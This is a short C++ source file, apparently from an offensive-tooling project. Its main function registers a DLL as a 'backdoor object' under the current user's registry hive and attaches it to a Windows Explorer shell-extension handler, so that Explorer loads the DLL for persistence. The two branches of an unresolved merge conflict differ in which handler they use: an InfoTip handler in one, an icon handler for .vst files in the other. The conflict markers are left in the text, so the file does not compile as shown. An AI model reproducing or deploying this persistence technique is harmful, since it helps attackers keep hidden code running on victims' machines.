#include "reg.h"



int wmain()
{
<<<<<<< HEAD
	std::wstring dllPath = L"c:\\users\\AliSAhmad\\source\\repos\\Test004\\x64\\Debug\\Test004.5.dll";
	GUID guid = reg::CreateBackdoorObj(HKCU, dllPath);
	reg::AddTechnique(INFOTIP_HANDLER, NULL, guid);
=======
	std::wstring dllPath = L"c:\\users\\AliSAhmad\\source\\repos\\Test004\\x64\\Debug\\Test004.4.dll";
	GUID guid = reg::CreateBackdoorObj(HKCU, dllPath);
	reg::AddTechnique(ICON_HANDLER, (WCHAR*)std::wstring(L".vst").c_str(), guid);
>>>>>>> 8a7699c804f7acf77c9c21ff5e2e093f22e0190e

}
